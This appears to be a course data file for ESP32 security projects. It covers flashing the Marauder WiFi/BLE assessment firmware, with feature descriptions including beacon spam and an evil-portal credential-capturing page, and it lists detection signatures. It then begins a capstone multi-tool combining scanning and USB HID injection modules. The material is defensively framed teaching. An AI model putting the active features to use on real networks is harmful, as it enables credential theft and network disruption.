        simulator: { available: false, note: 'This is a firmware deep-dive: flashing and exploring <strong>Marauder</strong> on the actual S3. Flashing vendor firmware and its radio features has nothing a simulator can stand in for. Read to understand the internals; flash on hardware.' },
        intro: '<p>ESP32 Marauder is an open-source WiFi and Bluetooth assessment firmware developed by justcallmekoko. It provides a menu-driven interface for WiFi scanning, Bluetooth scanning, packet capture, and network analysis &mdash; all running on an ESP32 with a display.</p>' +
               '<p>In this project you will flash the Marauder firmware onto your T-Display-S3, configure it for the ST7789 display, and learn what each tool does and how it is detected. This is a pre-built toolset &mdash; the learning is in understanding the capabilities and building detection for each one.</p>' +
               '<p>Marauder is a widely-used educational tool in cybersecurity training programs. Flashing it takes 10 minutes. Understanding it takes the rest of the course.</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 with USB-C.',

        wiringNotes: '<p><strong>No external wiring.</strong> Marauder uses the onboard WiFi, BLE, and display.</p>' +
                     '<p><strong>Legal:</strong> Marauder includes tools that transmit RF signals (beacon generation, probe requests). Only use transmit features in controlled lab environments with authorization. Passive features (scanning, packet capture) are legal for monitoring your own networks.</p>' +
                     '<p><strong>Safety:</strong> Some Marauder features can disrupt WiFi networks. Always use on your own network or in an isolated lab. Never run active features on networks you do not own.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg110-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg110-flash{0%{opacity:0.2}20%{opacity:1}40%{opacity:0.2}60%{opacity:0.9}80%{opacity:0.2}100%{opacity:0.6}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg110-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-110 MARAUDER FIRMWARE SUITE</text>' +

            '<!-- T-Display-S3 with Marauder -->' +
            '<rect x="230" y="50" width="260" height="190" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="230" y="50" width="260" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="360" y="69" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<text x="360" y="84" text-anchor="middle" fill="#fb923c" font-size="7">Flashed with ESP32 Marauder</text>' +
            '<!-- TFT showing Marauder menu -->' +
            '<rect x="248" y="95" width="110" height="125" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="303" y="112" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="700">MARAUDER</text>' +
            '<text x="258" y="128" fill="#60a5fa" font-size="6">&gt; WiFi Scan</text>' +
            '<text x="258" y="140" fill="#8b949e" font-size="6">  Bluetooth Scan</text>' +
            '<text x="258" y="152" fill="#8b949e" font-size="6">  Sniff Probes</text>' +
            '<text x="258" y="164" fill="#8b949e" font-size="6">  Beacon Spam</text>' +
            '<text x="258" y="176" fill="#8b949e" font-size="6">  Evil Portal</text>' +
            '<text x="258" y="188" fill="#8b949e" font-size="6">  Packet Monitor</text>' +
            '<text x="258" y="200" fill="#8b949e" font-size="6">  Settings</text>' +
            '<text x="258" y="212" fill="#555" font-size="5">v0.13.x tdisplay-s3</text>' +
            '<!-- ESP32-S3 -->' +
            '<rect x="380" y="100" width="95" height="42" rx="5" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="428" y="118" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="700">ESP32-S3</text>' +
            '<text x="428" y="132" text-anchor="middle" fill="#8b949e" font-size="6">WiFi + BLE</text>' +
            '<!-- Flash icon -->' +
            '<rect x="380" y="150" width="95" height="30" rx="4" fill="rgba(234,179,8,0.08)" stroke="#eab308" stroke-width="1" style="animation:sg110-flash 3s ease-in-out infinite"/>' +
            '<text x="428" y="168" text-anchor="middle" fill="#eab308" font-size="7">16MB FLASH</text>' +
            '<!-- Buttons -->' +
            '<circle cx="248" cy="230" r="7" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="248" y="248" text-anchor="middle" fill="#22c55e" font-size="6">BOOT</text>' +
            '<circle cx="472" cy="230" r="7" fill="#1a1f2b" stroke="#eab308" stroke-width="1.5"/>' +
            '<text x="472" y="248" text-anchor="middle" fill="#eab308" font-size="6">NAV</text>' +
            '<!-- USB-C -->' +
            '<rect x="335" y="228" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +

            '<!-- Flash process (left) -->' +
            '<rect x="30" y="50" width="175" height="145" rx="8" fill="rgba(59,130,246,0.04)" stroke="rgba(59,130,246,0.15)" stroke-width="0.5"/>' +
            '<text x="118" y="70" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">FLASH METHODS</text>' +
            '<text x="40" y="92" fill="#22c55e" font-size="7">1. Web Flasher (easiest)</text>' +
            '<text x="48" y="106" fill="#8b949e" font-size="6">esp.huhn.me &#8212; Chrome/Edge</text>' +
            '<text x="40" y="124" fill="#eab308" font-size="7">2. esptool CLI</text>' +
            '<text x="48" y="138" fill="#8b949e" font-size="6">pip install esptool</text>' +
            '<text x="48" y="152" fill="#8b949e" font-size="6">--chip esp32s3 write_flash</text>' +
            '<text x="40" y="170" fill="#8b949e" font-size="7">3. PlatformIO (rebuild)</text>' +
            '<text x="48" y="184" fill="#8b949e" font-size="6">For custom builds</text>' +

            '<!-- Marauder Capabilities (right) -->' +
            '<rect x="515" y="50" width="175" height="145" rx="8" fill="rgba(249,115,22,0.04)" stroke="rgba(249,115,22,0.15)" stroke-width="0.5"/>' +
            '<text x="603" y="70" text-anchor="middle" fill="#fb923c" font-size="9" font-weight="600">CAPABILITIES</text>' +
            '<rect x="525" y="82" width="10" height="10" rx="1" fill="rgba(34,197,94,0.3)"/>' +
            '<text x="540" y="91" fill="#22c55e" font-size="7">Passive (safe)</text>' +
            '<text x="530" y="106" fill="#8b949e" font-size="6">WiFi/BLE scan, probe sniff</text>' +
            '<text x="530" y="118" fill="#8b949e" font-size="6">Packet capture, PCAP log</text>' +
            '<rect x="525" y="130" width="10" height="10" rx="1" fill="rgba(239,68,68,0.3)"/>' +
            '<text x="540" y="139" fill="#ef4444" font-size="7">Active (lab only!)</text>' +
            '<text x="530" y="154" fill="#8b949e" font-size="6">Beacon spam, evil portal</text>' +
            '<text x="530" y="166" fill="#8b949e" font-size="6">Deauth (illegal outside lab)</text>' +
            '<text x="530" y="182" fill="#eab308" font-size="6">All active features detectable</text>' +

            '<!-- Detection signatures -->' +
            '<rect x="30" y="215" width="175" height="145" rx="8" fill="rgba(239,68,68,0.04)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="118" y="235" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">DETECTION SIGS</text>' +
            '<text x="40" y="256" fill="#8b949e" font-size="7">Espressif OUI in src MAC</text>' +
            '<text x="40" y="272" fill="#8b949e" font-size="7">Rapid SSID broadcast burst</text>' +
            '<text x="40" y="288" fill="#8b949e" font-size="7">Captive portal w/ ESP AP</text>' +
            '<text x="40" y="304" fill="#8b949e" font-size="7">Probe req flood pattern</text>' +
            '<text x="40" y="322" fill="#ef4444" font-size="7">WIDS flags in seconds</text>' +
            '<text x="40" y="338" fill="#8b949e" font-size="6" font-style="italic">Not stealth &#8212; every feature</text>' +
            '<text x="40" y="350" fill="#8b949e" font-size="6" font-style="italic">has a detectable signature</text>' +

            '<!-- Return to custom firmware -->' +
            '<rect x="515" y="215" width="175" height="145" rx="8" fill="rgba(168,85,247,0.04)" stroke="rgba(168,85,247,0.15)" stroke-width="0.5"/>' +
            '<text x="603" y="235" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="600">REVERSIBLE</text>' +
            '<text x="525" y="256" fill="#8b949e" font-size="7">Flash Marauder to explore</text>' +
            '<text x="525" y="272" fill="#8b949e" font-size="7">Return to custom firmware</text>' +
            '<text x="525" y="288" fill="#8b949e" font-size="7">anytime by re-flashing</text>' +
            '<text x="525" y="310" fill="#c084fc" font-size="7">Hold BOOT + plug USB</text>' +
            '<text x="525" y="326" fill="#8b949e" font-size="7">to enter bootloader mode</text>' +
            '<text x="525" y="348" fill="#eab308" font-size="6" font-style="italic">The board is never bricked</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'Download and Flash Marauder',
                content: '<p>The ESP32 Marauder firmware is available as a pre-compiled binary for various ESP32 boards. For the T-Display-S3, you need the S3-specific build with ST7789 display support.</p>',
                code: '# Option 1: Web Flasher (easiest)\n# Visit: https://esp.huhn.me/\n# or: https://github.com/justcallmekoko/ESP32Marauder/wiki\n# Select your board, click Flash\n\n# Option 2: esptool command line\npip install esptool\n\n# Download the T-Display-S3 build from:\n# https://github.com/justcallmekoko/ESP32Marauder/releases\n# Look for: esp32_marauder_*_tdisplay_s3.bin\n\n# Flash the firmware:\nesptool.py --chip esp32s3 \\\n    --port /dev/ttyACM0 \\\n    --baud 921600 \\\n    --before no_reset \\\n    --after hard_reset \\\n    write_flash 0x0 esp32_marauder_tdisplay_s3.bin\n\n# If flashing fails, hold BOOT button while plugging in USB',
                language: 'Bash',
                tip: '<strong>The web flasher is the easiest method.</strong> It works in Chrome/Edge (Web Serial API). No software installation needed. Just connect the board, select the firmware, and click Flash.'
            },
            {
                title: 'Navigate Marauder Features',
                content: '<p>Marauder provides a menu-driven interface on the TFT display. Here is what each major feature does and how it works at the protocol level:</p>' +
                         '<ul>' +
                         '<li><strong>Scan WiFi (Passive):</strong> Lists all visible access points with SSID, RSSI, channel, and encryption. Same as SG-105 but with a polished UI. Detection: none needed &mdash; passive scanning is invisible.</li>' +
                         '<li><strong>Scan Bluetooth:</strong> Lists BLE devices with manufacturer data parsing. Same as SG-106. Detection: none &mdash; passive BLE scanning cannot be detected.</li>' +
                         '<li><strong>Beacon Spam:</strong> Generates hundreds of fake WiFi access points. The target device WiFi list fills with garbage SSIDs. Detection: multiple SSIDs from the same BSSID or MAC OUI, rapid appearance of new networks.</li>' +
                         '<li><strong>Probe Request Sniff:</strong> Captures probe requests from nearby devices. Reveals which networks they have connected to in the past (their preferred network list). Detection: this is passive &mdash; cannot be detected.</li>' +
                         '<li><strong>PCAP Capture:</strong> Captures raw 802.11 frames and saves them in PCAP format to SD card for analysis in Wireshark. Detection: passive capture is invisible.</li>' +
                         '<li><strong>Evil Portal:</strong> Creates a captive portal that mimics a WiFi login page to capture credentials entered by users. Detection: certificate warnings, unfamiliar login pages, WIDS alerts for new SSIDs.</li>' +
                         '</ul>',
                code: null,
                language: null,
                tip: '<strong>For each Marauder feature, ask two questions:</strong> (1) What protocol vulnerability does this exploit? (2) How would I detect or prevent this on a network I defend? The tool is the teacher &mdash; the lesson is the defense.'
            },
            {
                title: 'Understanding the Detection Signatures',
                content: '<p>Every Marauder feature has a detectable signature. Building detection for these signatures is the real educational value:</p>',
                code: '# Detection signatures for Marauder features:\n\n# 1. Beacon Spam Detection:\n#    - Multiple SSIDs with sequential or patterned names\n#    - All beacons from same OUI (Espressif: 24:6F:28, DC:54:75)\n#    - Beacon rate > 50/sec from a single source\n#    - No data frames associated with the beacon SSIDs\n\n# 2. Evil Portal Detection:\n#    - New SSID matching a known network name but different BSSID\n#    - No WPA/WPA2 on a network that should be encrypted\n#    - HTTP login page with no valid TLS certificate\n#    - DNS responses all pointing to one IP (captive portal)\n\n# 3. Probe Request Analysis (as defender):\n#    - Monitor your own probe requests with Wireshark\n#    - Filter: wlan.fc.type_subtype == 0x04\n#    - Your device broadcasts every network it ever connected to\n#    - Defense: clear saved network list, use randomized MACs\n\n# 4. General ESP32 Detection:\n#    - Espressif OUI in the source MAC: 24:6F:28:xx:xx:xx\n#    - Many Marauder users forget to randomize the MAC\n#    - A "new Espressif device" appearing near your network\n#      is a strong indicator of a security assessment tool',
                language: 'Bash',
                tip: null
            },
            {
                title: 'Return to Custom Firmware',
                content: '<p>After exploring Marauder, you can flash your own firmware back using PlatformIO. Hold BOOT while plugging in USB to enter download mode, then upload your code normally.</p>' +
                         '<p>The value of Marauder is understanding what a pre-built tool can do. The value of SG-103 through SG-109 is understanding HOW it does it. In SG-111, you will build your own version that combines everything into a custom multi-tool.</p>',
                code: '# Restore your custom firmware:\n# 1. Hold BOOT button on T-Display-S3\n# 2. Plug in USB-C while holding BOOT\n# 3. Release BOOT after 2 seconds\n# 4. In PlatformIO: Upload (Ctrl+Alt+U)\n# 5. Your code replaces Marauder\n\n# To flash Marauder again later:\n# Repeat the esptool command from Step 1',
                language: 'Bash',
                tip: null
            }
        ],

        testing: '<p>Verify Marauder is running:</p>' +
                 '<ul>' +
                 '<li><strong>Display:</strong> Marauder logo and version appear on the TFT after flashing.</li>' +
                 '<li><strong>WiFi Scan:</strong> Select WiFi > Scan. Your networks should appear within 5 seconds.</li>' +
                 '<li><strong>BLE Scan:</strong> Select Bluetooth > Scan. Nearby BLE devices appear.</li>' +
                 '<li><strong>Menu navigation:</strong> Use the on-screen buttons or touch (if your S3 variant has touch) to navigate menus.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Blank screen after flash:</strong> The firmware may not match your exact T-Display-S3 hardware revision. Try a different build from the Marauder releases page. Some S3 variants need different display pin configurations.</li>' +
                         '<li><strong>Cannot enter download mode:</strong> Hold BOOT before and during USB plug-in. Some boards require holding BOOT + pressing RST, then releasing RST first, then BOOT.</li>' +
                         '<li><strong>WiFi scan returns 0:</strong> Some Marauder builds default to a specific region. Check if your region settings match your location (affects available channels).</li>' +
                         '<li><strong>SD card not detected:</strong> Marauder uses specific SPI pins for the SD card. If your T-Display-S3 does not have an SD slot, PCAP capture to SD will not work.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Feature Audit</strong> &mdash; For each Marauder feature, document: (1) what protocol it uses, (2) what vulnerability it exploits, (3) how to detect it, (4) how to prevent it. Create a defense playbook.</p>' +
                    '<p><strong>Challenge 2: WIDS Rule Writing</strong> &mdash; Using the detection signatures from Step 3, write Snort or Suricata rules that would detect each Marauder feature. Test them against a Marauder-generated PCAP file.</p>' +
                    '<p><strong>Challenge 3: Compare Marauder to Your Custom Tools</strong> &mdash; Compare Marauder WiFi scan output with your SG-105 scanner. Compare Marauder BLE scan with your SG-106 scanner. Document what Marauder does better and what your custom code does better. Identify features you want to add to your own tools.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'Runs the ESP32 Marauder firmware. Same board, different software. Marauder provides a polished menu-driven interface for WiFi and BLE security assessment.', specs: ['Marauder firmware', 'Web flasher or esptool', 'Menu-driven TFT interface', 'WiFi + BLE tools'] }] },
        commonMistakes: [
            { title: 'Using Active Marauder Features on Production Networks', correct: 'Only use active features (beacon spam, evil portal) on your own network or in an isolated lab. Passive features (scan, probe sniff, PCAP capture) are safe on any network you have permission to monitor.', incorrect: 'Running beacon spam or evil portal on a school, office, or public WiFi network.', consequence: 'Beacon spam floods every device in range with fake networks. Evil portal can capture credentials from unsuspecting users. Both are detectable and can trigger security incidents, disciplinary action, or legal consequences.' },
            { title: 'Assuming Marauder is Undetectable', correct: 'Every Marauder feature has a detection signature. The ESP32 OUI (Espressif) in the source MAC is the most obvious. A WIDS will flag a new Espressif device appearing near your network.', incorrect: 'Believing that because Marauder is a small device, it cannot be detected by network security tools.', consequence: 'False confidence. Enterprise WIDS solutions detect Marauder features within seconds. Your "stealth" test becomes a visible security event in the SOC dashboard.' },
            { title: 'Not Documenting Findings', correct: 'Every test with Marauder should produce documentation: what was tested, what was found, what the defense recommendation is. This is how professional assessments work.', incorrect: 'Using Marauder as a toy to "hack WiFi" without recording observations or producing actionable findings.', consequence: 'No learning value. The point is not to disrupt networks &mdash; it is to identify vulnerabilities and recommend defenses. Without documentation, the exercise is just disruption.' }
        ]
    },

    // ========================================================================
    // SG-111: Custom Army Knife — Your Own Multi-Tool
    // ========================================================================
    'sg-111': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'The multi-tool combines the USB-HID, BLE, and WiFi-radio capabilities of the earlier builds &mdash; each of which needs real hardware &mdash; on the T-Display-S3. So does the combined tool. Use this page to plan the build; assemble it on the board.' },
        intro: '<p>This is the capstone. You will build your own multi-tool firmware from scratch, combining every technique from SG-103 through SG-109 into a single, menu-driven application. WiFi scanning, BLE scanning, USB HID injection, USB mass storage, network impersonation, and attack detection &mdash; all accessible from the TFT display.</p>' +
               '<p>Unlike Marauder (which is pre-built), this is YOUR code. You understand every line because you wrote it in the previous projects. You can customize it, extend it, and use it as a portfolio piece.</p>' +
               '<p>The menu system uses a modular architecture: each tool is a "module" that can be loaded and unloaded independently, managing its own resources (WiFi radio, BLE radio, USB stack).</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 with USB-C.\n    Optional: MicroSD breakout from SG-107.',

        wiringNotes: '<p><strong>No external wiring for base configuration.</strong> Add SD breakout from SG-107 for payload storage and PCAP logging.</p>' +
                     '<p><strong>Authorization:</strong> This device combines multiple assessment capabilities. Only deploy on systems and networks you own or have explicit written authorization to test.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg111-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg111-modswitch{0%,40%{opacity:1}50%{opacity:0.2}60%,100%{opacity:1}}' +
            '@keyframes sg111-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg111-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-111 CUSTOM ARMY KNIFE ARCHITECTURE</text>' +

            '<!-- T-Display-S3 Board -->' +
            '<rect x="40" y="50" width="240" height="200" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="40" y="50" width="240" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="160" y="69" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<!-- TFT showing army knife menu -->' +
            '<rect x="55" y="88" width="100" height="140" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="105" y="105" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="700">ARMY KNIFE</text>' +
            '<text x="65" y="120" fill="#60a5fa" font-size="6">&gt; WiFi Scanner</text>' +
            '<text x="65" y="132" fill="#8b949e" font-size="6">  BLE Scanner</text>' +
            '<text x="65" y="144" fill="#8b949e" font-size="6">  USB HID</text>' +
            '<text x="65" y="156" fill="#8b949e" font-size="6">  USB Storage</text>' +
            '<text x="65" y="168" fill="#8b949e" font-size="6">  Deauth Detect</text>' +
            '<text x="65" y="180" fill="#8b949e" font-size="6">  Settings</text>' +
            '<rect x="62" y="195" width="86" height="20" rx="3" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="105" y="209" text-anchor="middle" fill="#22c55e" font-size="6">YOUR CODE</text>' +
            '<!-- ESP32-S3 -->' +
            '<rect x="175" y="95" width="90" height="42" rx="5" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="220" y="114" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="700">ESP32-S3</text>' +
            '<text x="220" y="128" text-anchor="middle" fill="#8b949e" font-size="6">All radios</text>' +
            '<!-- Resource indicators -->' +
            '<rect x="175" y="145" width="90" height="76" rx="4" fill="rgba(249,115,22,0.06)" stroke="rgba(249,115,22,0.15)" stroke-width="0.5"/>' +
            '<text x="220" y="160" text-anchor="middle" fill="#fb923c" font-size="6" font-weight="600">RESOURCES</text>' +
            '<text x="185" y="174" fill="#8b949e" font-size="5">WiFi Radio</text>' +
            '<text x="185" y="186" fill="#8b949e" font-size="5">BLE Radio</text>' +
            '<text x="185" y="198" fill="#8b949e" font-size="5">USB Stack</text>' +
            '<text x="185" y="210" fill="#ef4444" font-size="5">One at a time!</text>' +
            '<!-- USB-C -->' +
            '<rect x="135" y="238" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +

            '<!-- Module architecture (center) -->' +
            '<rect x="310" y="50" width="190" height="200" rx="8" fill="#1e2736" stroke="#f97316" stroke-width="1.5"/>' +
            '<rect x="310" y="50" width="190" height="24" rx="8" fill="rgba(249,115,22,0.12)"/>' +
            '<rect x="310" y="66" width="190" height="8" fill="rgba(249,115,22,0.12)"/>' +
            '<text x="405" y="66" text-anchor="middle" fill="#fb923c" font-size="10" font-weight="600">MODULE INTERFACE</text>' +
            '<!-- Interface methods -->' +
            '<rect x="320" y="84" width="170" height="24" rx="3" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5" style="animation:sg111-modswitch 3s ease-in-out infinite"/>' +
            '<text x="405" y="100" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">init() &#8594; run() &#8594; draw()</text>' +
            '<rect x="320" y="114" width="170" height="18" rx="3" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="405" y="127" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">cleanup() &#8212; CRITICAL</text>' +
            '<!-- Module list -->' +
            '<text x="330" y="150" fill="#22c55e" font-size="7">WiFiScanModule</text>' +
            '<text x="458" y="150" fill="#8b949e" font-size="6">SG-105</text>' +
            '<text x="330" y="164" fill="#3b82f6" font-size="7">BLEScanModule</text>' +
            '<text x="458" y="164" fill="#8b949e" font-size="6">SG-106</text>' +
            '<text x="330" y="178" fill="#ef4444" font-size="7">USBHIDModule</text>' +
            '<text x="458" y="178" fill="#8b949e" font-size="6">SG-104</text>' +
            '<text x="330" y="192" fill="#eab308" font-size="7">USBStorageModule</text>' +
            '<text x="458" y="192" fill="#8b949e" font-size="6">SG-107</text>' +
            '<text x="330" y="206" fill="#a855f7" font-size="7">DeauthDetectModule</text>' +
            '<text x="458" y="206" fill="#8b949e" font-size="6">SG-109</text>' +
            '<text x="330" y="220" fill="#8b949e" font-size="7">SettingsModule</text>' +
            '<text x="458" y="220" fill="#8b949e" font-size="6">Config</text>' +
            '<text x="405" y="242" text-anchor="middle" fill="#555" font-size="6">switchModule() handles transitions</text>' +

            '<!-- Resource conflict diagram (right) -->' +
            '<rect x="530" y="50" width="160" height="200" rx="8" fill="rgba(239,68,68,0.04)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="610" y="70" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">RESOURCE RULES</text>' +
            '<text x="540" y="92" fill="#8b949e" font-size="7">WiFi and BLE share</text>' +
            '<text x="540" y="106" fill="#8b949e" font-size="7">the same 2.4GHz radio</text>' +
            '<rect x="540" y="116" width="140" height="20" rx="3" fill="rgba(239,68,68,0.08)"/>' +
            '<text x="610" y="130" text-anchor="middle" fill="#ef4444" font-size="7">Cannot run together!</text>' +
            '<text x="540" y="152" fill="#8b949e" font-size="7">USB HID and MSC need</text>' +
            '<text x="540" y="166" fill="#8b949e" font-size="7">separate USB.begin()</text>' +
            '<rect x="540" y="176" width="140" height="20" rx="3" fill="rgba(234,179,8,0.08)"/>' +
            '<text x="610" y="190" text-anchor="middle" fill="#eab308" font-size="7">Deinit before switch</text>' +
            '<text x="540" y="212" fill="#22c55e" font-size="7">Static memory only</text>' +
            '<text x="540" y="226" fill="#8b949e" font-size="6">No malloc in run loops</text>' +
            '<text x="540" y="240" fill="#8b949e" font-size="6">Heap frag = crash</text>' +

            '<!-- Optional SD card note -->' +
            '<rect x="40" y="270" width="240" height="90" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="290" fill="#4ade80" font-size="8" font-weight="600">WIRING</text>' +
            '<text x="50" y="308" fill="#8b949e" font-size="7">No wiring for base config</text>' +
            '<text x="50" y="324" fill="#8b949e" font-size="7">Optional: MicroSD from SG-107</text>' +
            '<text x="50" y="340" fill="#8b949e" font-size="7">for payload storage + PCAP logs</text>' +
            '<text x="50" y="352" fill="#8b949e" font-size="6" font-style="italic">Same SPI wiring as SG-107</text>' +

            '<!-- Capstone callout -->' +
            '<rect x="310" y="270" width="380" height="90" rx="6" fill="rgba(168,85,247,0.06)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="500" y="290" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="600">CAPSTONE PROJECT</text>' +
            '<text x="320" y="310" fill="#8b949e" font-size="7">Combines every technique from SG-103 through SG-109 into one firmware</text>' +
            '<text x="320" y="328" fill="#8b949e" font-size="7">Unlike Marauder &#8212; this is YOUR code, every line written by you</text>' +
            '<text x="320" y="346" fill="#22c55e" font-size="7">Portfolio piece: custom ESP32-S3 security multi-tool</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'Module Architecture Design',
                content: '<p>Each tool is a module with a standard interface: <code>init()</code>, <code>run()</code>, <code>draw()</code>, and <code>cleanup()</code>. The main menu loads one module at a time, cleaning up the previous module before starting the next. This prevents resource conflicts (WiFi vs BLE, CDC vs HID).</p>',
                code: '// Module interface\nclass ToolModule {\npublic:\n    virtual const char* name() = 0;\n    virtual const char* description() = 0;\n    virtual void init() = 0;\n    virtual void run() = 0;       // Called in loop()\n    virtual void draw() = 0;      // Render to TFT\n    virtual void cleanup() = 0;   // Release resources\n    virtual void onButton(int btn) = 0;  // Handle button press\n};\n\n// Module registry\nToolModule* modules[] = {\n    new WiFiScanModule(),      // SG-105\n    new BLEScanModule(),       // SG-106\n    new USBHIDModule(),        // SG-104\n    new USBStorageModule(),    // SG-107\n    new DeauthDetectModule(),  // SG-109\n    new SettingsModule()       // Device settings\n};\nconst int NUM_MODULES = 6;\nint currentModule = -1;  // -1 = main menu\n\nvoid switchModule(int idx) {\n    if (currentModule >= 0) {\n        modules[currentModule]->cleanup();\n    }\n    currentModule = idx;\n    if (idx >= 0) {\n        modules[idx]->init();\n        modules[idx]->draw();\n    } else {\n        drawMainMenu();\n    }\n}',
                language: 'C++',
                tip: '<strong>The cleanup() method is critical.</strong> WiFi and BLE share the same radio. If the WiFi module does not call <code>WiFi.mode(WIFI_OFF)</code> in cleanup(), the BLE module cannot initialize. USB HID and MSC must be deinitialized before switching USB modes. Resource management is the hard part of building a multi-tool.'
            },
            {
                title: 'Main Menu with Status Bar',
                content: '<p>The main menu shows all available modules with icons and descriptions. A status bar at the top shows device state: USB mode, WiFi/BLE status, and battery level (if LiPo connected).</p>',
                code: 'void drawMainMenu() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Status bar\n    tft.fillRect(0, 0, 320, 14, 0x1082);\n    tft.setTextColor(TFT_CYAN, 0x1082);\n    tft.setCursor(5, 3);\n    tft.print("S3 ARSENAL");\n    tft.setTextColor(0x8410, 0x1082);\n    tft.setCursor(200, 3);\n    tft.printf("USB:%s  WiFi:%s",\n        usbActive ? "HID" : "CDC",\n        wifiActive ? "ON" : "OFF");\n    \n    // Module list\n    for (int i = 0; i < NUM_MODULES; i++) {\n        int y = 20 + i * 22;\n        \n        if (i == selectedModule) {\n            tft.fillRect(0, y, 320, 20, 0x1082);\n            tft.setTextColor(TFT_CYAN, 0x1082);\n        } else {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        }\n        \n        tft.setCursor(10, y + 4);\n        tft.printf("[%d] %s", i + 1, modules[i]->name());\n        \n        tft.setTextColor(0x8410, i == selectedModule ? 0x1082 : TFT_BLACK);\n        tft.setCursor(180, y + 4);\n        tft.print(modules[i]->description());\n    }\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(10, 155);\n    tft.println("BOOT=navigate  USER=launch");\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'WiFi Scanner Module (from SG-105)',
                content: '<p>Wrap your SG-105 WiFi scanner in the module interface. The key difference: init() sets up WiFi, cleanup() turns it off. The module owns the WiFi radio while active.</p>',
                code: 'class WiFiScanModule : public ToolModule {\npublic:\n    const char* name() override { return "WiFi Recon"; }\n    const char* description() override { return "Scan 2.4GHz"; }\n    \n    void init() override {\n        WiFi.mode(WIFI_STA);\n        WiFi.disconnect();\n        scanNetworks();  // From SG-105\n    }\n    \n    void run() override {\n        // Auto-scan every 10 seconds\n        if (millis() - lastScan > 10000) {\n            scanNetworks();\n            draw();\n            lastScan = millis();\n        }\n    }\n    \n    void draw() override {\n        drawNetworkList();  // From SG-105\n    }\n    \n    void cleanup() override {\n        WiFi.mode(WIFI_OFF);\n        wifiActive = false;\n    }\n    \n    void onButton(int btn) override {\n        if (btn == 0) { /* toggle view */ }\n        if (btn == 14) { /* scroll */ }\n    }\n};',
                language: 'C++',
